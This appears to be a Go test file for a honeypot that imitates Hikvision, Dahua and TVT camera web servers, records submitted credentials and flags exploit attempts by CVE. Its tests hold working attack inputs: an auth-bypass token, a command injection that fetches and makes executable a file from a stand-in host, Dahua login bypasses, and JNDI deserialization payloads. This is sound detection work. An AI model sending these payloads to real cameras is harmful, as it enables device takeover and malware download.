package webcam

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"
	"time"
)

func get(s *Server, v Vendor, method, target string, hdr map[string]string, body string) Response {
	if hdr == nil {
		hdr = map[string]string{}
	}
	return s.Respond(v, Request{Method: method, Target: target, Headers: hdr, Body: []byte(body)})
}

func basic(user, pass string) map[string]string {
	return map[string]string{"Authorization": "Basic " + b64(user+":"+pass)}
}

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

func TestHikvisionLoginAndRoot(t *testing.T) {
	s := New("seed")
	if r := get(s, Hikvision, "GET", "/", nil, ""); r.Status != 200 || !strings.Contains(string(r.Body), "login.asp") || r.Server != "App-webs/" {
		t.Fatalf("root: %+v", r)
	}
	if r := get(s, Hikvision, "GET", "/doc/page/login.asp", nil, ""); r.Status != 200 || !strings.Contains(string(r.Body), "<form") {
		t.Fatalf("login: %+v", r)
	}
	if r := get(s, Hikvision, "GET", "/nothing", nil, ""); r.Status != 404 {
		t.Fatalf("unknown path: %d", r.Status)
	}
}

func TestHikvisionAuthParameterBypass(t *testing.T) {
	s := New("seed")
	r := get(s, Hikvision, "GET", "/System/deviceInfo?auth=YWRtaW46MTEK", nil, "")
	if r.Status != 200 || !strings.Contains(string(r.Body), "<serialNumber>"+s.Identity().Serial[Hikvision]+"</serialNumber>") {
		t.Fatalf("deviceInfo: %d %s", r.Status, r.Body)
	}
	if !strings.Contains(r.Signature, "CVE-2017-7921") {
		t.Errorf("signature %q", r.Signature)
	}
	for _, p := range []string{"/Security/users?auth=YWRtaW46MTEK", "/ISAPI/Security/users?auth=YWRtaW46MTEK", "/System/configurationFile?auth=YWRtaW46MTEK", "/onvif-http/snapshot?auth=YWRtaW46MTEK"} {
		if rr := get(s, Hikvision, "GET", p, nil, ""); rr.Status != 200 || rr.Signature == "" {
			t.Errorf("%s -> %d sig=%q", p, rr.Status, rr.Signature)
		}
	}
	if r := get(s, Hikvision, "GET", "/System/configurationFile?auth=YWRtaW46MTEK", nil, ""); len(r.Body) != 8192 {
		t.Errorf("configurationFile length %d", len(r.Body))
	}
	if r := get(s, Hikvision, "GET", "/onvif-http/snapshot?auth=YWRtaW46MTEK", nil, ""); !bytes.HasPrefix(r.Body, []byte{0xff, 0xd8}) {
		t.Errorf("snapshot is not a JPEG")
	}
	noauth := get(s, Hikvision, "GET", "/System/deviceInfo", nil, "")
	if noauth.Status != 401 || noauth.Signature != "" {
		t.Fatalf("without auth: %d sig=%q", noauth.Status, noauth.Signature)
	}
	if hdr := noauth.Extra[0]; hdr[0] != "WWW-Authenticate" || !strings.HasPrefix(hdr[1], "Digest realm=") {
		t.Errorf("challenge %v", noauth.Extra)
	}
}

func TestHikvisionWebLanguageInjection(t *testing.T) {
	s := New("seed")
	body := `<?xml version="1.0" encoding="UTF-8"?><language>$(wget http://203.0.113.9/x -O /tmp/x;chmod 777 /tmp/x)</language>`
	r := get(s, Hikvision, "PUT", "/SDK/webLanguage", nil, body)
	if r.Status != 200 || !strings.Contains(r.Signature, "CVE-2021-36260") {
		t.Fatalf("%d %q", r.Status, r.Signature)
	}
	if len(r.Commands) != 1 || !strings.HasPrefix(r.Commands[0], "wget http://203.0.113.9/x") {
		t.Fatalf("commands %v", r.Commands)
	}
	if benign := get(s, Hikvision, "PUT", "/SDK/webLanguage", nil, "<language>en</language>"); benign.Signature != "" {
		t.Errorf("benign language change flagged: %q", benign.Signature)
	}
}

func TestBasicCredentialsAreRecorded(t *testing.T) {
	s := New("seed")
	r := get(s, Hikvision, "GET", "/ISAPI/System/deviceInfo", basic("admin", "12345"), "")
	if r.Status != 200 {
		t.Fatalf("status %d", r.Status)
	}
	if len(r.Credentials) != 1 || r.Credentials[0] != (Credential{"admin", "12345"}) {
		t.Fatalf("credentials %v", r.Credentials)
	}
	d := get(s, Hikvision, "GET", "/ISAPI/System/deviceInfo", map[string]string{"Authorization": `Digest username="root", realm="x", response="abc"`}, "")
	if len(d.Credentials) != 1 || d.Credentials[0].Username != "root" {
		t.Fatalf("digest credentials %v", d.Credentials)
	}
}

func TestDahuaLoginChallengeAndBypass(t *testing.T) {
	s := New("seed")
	r := get(s, Dahua, "POST", "/RPC2_Login", nil, `{"method":"global.login","params":{"userName":"admin","password":"","clientType":"Web3.0"},"id":1}`)
	var got struct {
		ID     int  `json:"id"`
		Result bool `json:"result"`
		Params struct{ Realm, Random string }
	}
	if err := json.Unmarshal(r.Body, &got); err != nil {
		t.Fatalf("challenge is not JSON: %v: %s", err, r.Body)
	}
	if got.Result || got.ID != 1 || got.Params.Realm != "Login to "+s.Identity().Serial[Dahua] || got.Params.Random == "" {
		t.Fatalf("challenge %+v", got)
	}

	nk := get(s, Dahua, "POST", "/RPC2_Login", nil, `{"method":"global.login","params":{"userName":"admin","password":"","clientType":"NetKeyboard"},"id":7}`)
	if !strings.Contains(nk.Signature, "CVE-2021-33044") || !strings.Contains(string(nk.Body), `"result":true`) {
		t.Fatalf("NetKeyboard: sig=%q body=%s", nk.Signature, nk.Body)
	}
	lb := get(s, Dahua, "POST", "/RPC2_Login", nil, `{"method":"global.login","params":{"userName":"admin","password":"x","clientType":"Loopback","ipAddr":"127.0.0.1"},"id":8}`)
	if !strings.Contains(lb.Signature, "CVE-2021-33045") {
		t.Fatalf("loopback: %q", lb.Signature)
	}
	ok := get(s, Dahua, "POST", "/RPC2_Login", nil, `{"method":"global.login","params":{"userName":"root","password":"hash","clientType":"Web3.0"},"id":3}`)
	if !strings.Contains(string(ok.Body), `"result":true`) || len(ok.Credentials) != 1 || ok.Credentials[0].Username != "root" {
		t.Fatalf("login: %s %v", ok.Body, ok.Credentials)
	}
	if bad := get(s, Dahua, "POST", "/RPC2_Login", nil, `not json`); bad.Status != 400 {
		t.Errorf("garbage body: %d", bad.Status)
	}
}

func TestDahuaCGIRequiresAuth(t *testing.T) {
	s := New("seed")
	if r := get(s, Dahua, "GET", "/cgi-bin/magicBox.cgi?action=getSystemInfo", nil, ""); r.Status != 401 {
		t.Fatalf("no auth: %d", r.Status)
	}
	r := get(s, Dahua, "GET", "/cgi-bin/magicBox.cgi?action=getSystemInfo", basic("admin", "admin"), "")
	if r.Status != 200 || !strings.Contains(string(r.Body), "serialNumber="+s.Identity().Serial[Dahua]) {
		t.Fatalf("%d %s", r.Status, r.Body)
	}
	rpc := get(s, Dahua, "POST", "/RPC2", nil, `{"method":"magicBox.getSystemInfo","id":5,"session":"abc"}`)
	if !strings.Contains(string(rpc.Body), s.Identity().Serial[Dahua]) || !strings.Contains(string(rpc.Body), `"session":"abc"`) {
		t.Fatalf("rpc: %s", rpc.Body)
	}
}

func TestTVTIsHonestlyThin(t *testing.T) {
	s := New("seed")
	r := get(s, TVT, "GET", "/", nil, "")
	if r.Status != 200 || !strings.Contains(string(r.Body), "NVMS-9000") {
		t.Fatalf("%d %s", r.Status, r.Body)
	}
	if r := get(s, TVT, "POST", "/anything", basic("admin", "888888"), "x"); r.Status != 404 || len(r.Credentials) != 1 || r.Signature != "" {
		t.Fatalf("%d creds=%v sig=%q", r.Status, r.Credentials, r.Signature)
	}
}

func TestPathFingerprintOverridesPortVendor(t *testing.T) {
	s := New("seed")
	r := get(s, TVT, "POST", "/RPC2_Login", nil, `{"method":"global.login","params":{"userName":"a","password":""},"id":1}`)
	if r.Server != "" && r.Server != "Webs" {
		t.Errorf("Dahua path on a TVT port served by %q", r.Server)
	}
	if !strings.Contains(string(r.Body), "login challenge") {
		t.Fatalf("expected the Dahua challenge: %s", r.Body)
	}
}

func TestIdentityIsStablePerSeedAndDiffersAcrossSeeds(t *testing.T) {
	a, b, a2 := NewIdentity("one"), NewIdentity("two"), NewIdentity("one")
	for _, v := range Vendors() {
		if a.Serial[v] != a2.Serial[v] || a.MAC[v] != a2.MAC[v] {
			t.Errorf("%s identity not stable", v)
		}
		if a.Serial[v] == b.Serial[v] {
			t.Errorf("%s serial identical for different seeds", v)
		}
	}
}

func TestWireFormat(t *testing.T) {
	s := New("seed")
	r := get(s, Hikvision, "GET", "/", nil, "")
	now := time.Date(2026, 1, 2, 3, 4, 5, 0, time.UTC)
	wire := string(r.Bytes("GET", true, now))
	for _, want := range []string{"HTTP/1.1 200 OK\r\n", "Date: Fri, 02 Jan 2026 03:04:05 GMT\r\n", "Server: App-webs/\r\n", "Connection: keep-alive\r\n\r\n"} {
		if !strings.Contains(wire, want) {
			t.Errorf("missing %q in %q", want, wire)
		}
	}
	head := string(r.Bytes("HEAD", false, now))
	if strings.Contains(head, "<html>") || !strings.Contains(head, "Content-Length: ") {
		t.Errorf("HEAD must carry headers only: %q", head)
	}
}

func TestParseVendorAndHostileInput(t *testing.T) {
	if v, ok := ParseVendor(" Hikvision "); !ok || v != Hikvision {
		t.Error("ParseVendor")
	}
	if _, ok := ParseVendor("axis"); ok {
		t.Error("unknown vendor accepted")
	}
	s := New("seed")
	for _, target := range []string{"", "*", "http://[::1", "/%zz", "/" + strings.Repeat("A", 5000)} {
		r := get(s, Hikvision, "GET", target, nil, "")
		if r.Status == 0 {
			t.Errorf("no status for %q", target)
		}
	}
	for _, body := range []string{"", "{", `{"id":"x","params":[1]}`, strings.Repeat("{", 5000)} {
		if r := get(s, Dahua, "POST", "/RPC2_Login", nil, body); r.Status == 0 {
			t.Errorf("no status for body %q", body)
		}
	}
}

func TestOnlyTheDocumentedBypassTokenIsConfirmed(t *testing.T) {
	s := New("seed")
	for _, q := range []string{"auth=x", "auth=", "auth=YWRtaW46MTEKAAAA", "auth=YWRtaW46MTE", "Auth=YWRtaW46MTEK", "x=YWRtaW46MTEK"} {
		r := get(s, Hikvision, "GET", "/System/deviceInfo?"+q, nil, "")
		if r.Signature != "" || r.Status != 401 {
			t.Errorf("%q: status %d signature %q", q, r.Status, r.Signature)
		}
	}
	for _, q := range []string{"auth=YWRtaW46MTEK", "auth=YWRtaW46MTEK%0A", "auth=%59WRtaW46MTEK"} {
		if r := get(s, Hikvision, "GET", "/System/deviceInfo?"+q, nil, ""); r.Signature == "" {
			t.Errorf("%q must be confirmed", q)
		}
	}
	if r := get(s, Hikvision, "POST", "/System/deviceInfo?auth=YWRtaW46MTEK", nil, ""); r.Signature != "" {
		t.Errorf("only GET is the documented method, got %q", r.Signature)
	}
}

func TestCrawlersAndBenignRequestsAreNeverSignatures(t *testing.T) {
	s := New("seed")
	hdr := map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
	cases := []struct {
		name, method, target, body string
	}{
		{"root", "GET", "/", ""},
		{"favicon", "GET", "/favicon.ico", ""},
		{"robots", "GET", "/robots.txt", ""},
		{"sitemap", "GET", "/sitemap.xml", ""},
		{"git config", "GET", "/.git/config", ""},
		{"wordpress", "GET", "/wp-login.php", ""},
		{"phpmyadmin", "GET", "/phpmyadmin/", ""},
		{"cgi-bin", "GET", "/cgi-bin/test.cgi", ""},
		{"admin", "GET", "/admin", ""},
		{"login page", "GET", "/doc/page/login.asp", ""},
		{"options", "OPTIONS", "*", ""},
		{"deviceInfo no auth", "GET", "/System/deviceInfo", ""},
		{"deviceInfo wrong token", "GET", "/System/deviceInfo?auth=cHJvYmU=", ""},
		{"users no auth", "GET", "/ISAPI/Security/users", ""},
		{"webLanguage GET", "GET", "/SDK/webLanguage", ""},
		{"webLanguage benign PUT", "PUT", "/SDK/webLanguage", "<language>en</language>"},
		{"webLanguage POST injection", "POST", "/SDK/webLanguage", "<language>$(id)</language>"},
		{"webLanguage no language tag", "PUT", "/SDK/webLanguage", "$(id)"},
		{"dahua plain login", "POST", "/RPC2_Login", `{"method":"global.login","params":{"userName":"admin","password":"x","clientType":"Web3.0"},"id":1}`},
		{"dahua loopback text elsewhere", "POST", "/RPC2_Login", `{"method":"global.login","params":{"userName":"admin","password":"x","note":"127.0.0.1 NetKeyboard"},"id":1}`},
		{"dahua other method", "POST", "/RPC2_Login", `{"method":"global.logout","params":{"clientType":"NetKeyboard"},"id":1}`},
		{"dahua rpc", "POST", "/RPC2", `{"method":"system.listService","id":1}`},
		{"dahua cgi", "GET", "/cgi-bin/magicBox.cgi?action=getSystemInfo", ""},
		{"php page", "GET", "/index.php?id=3", ""},
		{"php hello world", "GET", "/hello.world", ""},
		{"phpinfo", "GET", "/phpinfo.php", ""},
		{"applyCT GET", "GET", "/bic/ssoService/v1/applyCT", ""},
		{"applyCT empty POST", "POST", "/bic/ssoService/v1/applyCT", ""},
		{"applyCT benign json", "POST", "/bic/ssoService/v1/applyCT", `{"user":"a","ticket":"b"}`},
		{"applyCT type without jndi", "POST", "/bic/ssoService/v1/applyCT", `{"@type":"java.lang.String","v":"x"}`},
		{"applyCT jndi without type", "POST", "/bic/ssoService/v1/applyCT", `{"v":"ldap://203.0.113.9/a"}`},
		{"applyCT not json", "POST", "/bic/ssoService/v1/applyCT", `@type ldap://203.0.113.9/a`},
		{"applyCT PUT", "PUT", "/bic/ssoService/v1/applyCT", `{"@type":"x","v":"ldap://203.0.113.9/a"}`},
		{"bic other path", "POST", "/bic/ssoService/v1/other", `{"@type":"x","v":"ldap://203.0.113.9/a"}`},
	}
	for _, v := range Vendors() {
		for _, c := range cases {
			r := get(s, v, c.method, c.target, hdr, c.body)
			if r.Signature != "" || len(r.Commands) != 0 {
				t.Errorf("%s/%s: signature %q commands %v", v, c.name, r.Signature, r.Commands)
			}
		}
	}
}

func TestHikvisionApplyCTDeserialization(t *testing.T) {
	s := New("seed")
	bodies := []string{
		`{"a":{"@type":"java.net.Inet4Address","val":"x"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://203.0.113.9:1389/a","autoCommit":true}}`,
		`{"x":[{"@type":"java.lang.Class","val":"y"},{"@type":"z","u":"rmi://203.0.113.9/a"}]}`,
	}
	for _, b := range bodies {
		for _, v := range []Vendor{Hikvision, Dahua, TVT} {
			r := get(s, v, "POST", "/bic/ssoService/v1/applyCT", map[string]string{"Content-Type": "application/json"}, b)
			if r.Status != 200 || !strings.Contains(r.Signature, "CVE-2025-34067") {
				t.Errorf("%s: %d %q", v, r.Status, r.Signature)
			}
			if !json.Valid(r.Body) {
				t.Errorf("decoy is not JSON: %s", r.Body)
			}
		}
	}
}
